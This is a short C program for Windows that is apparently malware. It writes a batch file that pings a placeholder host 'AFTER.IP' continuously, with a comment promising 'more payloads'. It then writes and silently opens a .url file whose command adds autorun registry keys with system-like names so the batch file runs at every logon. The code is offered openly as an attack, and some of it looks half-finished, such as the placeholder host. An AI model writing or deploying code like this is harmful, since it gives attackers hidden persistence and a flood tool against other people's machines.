#include <windows.h>
#include <stdio.h>

void WriteBatch() {
    FILE *fp = fopen("C:\\Windows\\SystemWindows.bat", "w");
    if (fp) {
        fprintf(fp,
            "@echo off\n"
            "ping AFTER.IP -t >nul\n"
            ":: more payloads\n"
        );
        fclose(fp);
    }
}

void WriteURLExploit() {
    FILE *fp = fopen("C:\\Windows\\ExploitPersist.url", "w");
    if (fp) {
        fprintf(fp,
            "[InternetShortcut]\n"
            "URL=cmd.exe /c reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsHelper /t REG_SZ /d \"C:\\Windows\\SystemWindows.bat\" /f && "
            "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WinHost /t REG_SZ /d \"C:\\Windows\\SystemWindows.bat\" /f && "
            "start C:\\Windows\\SystemWindows.bat\n"
        );
        fclose(fp);
    }
}

int main() {
    WriteBatch();
    WriteURLExploit();
    ShellExecuteA(NULL, "open", "C:\\Windows\\ExploitPersist.url", NULL, NULL, SW_HIDE);
    return 0;
}
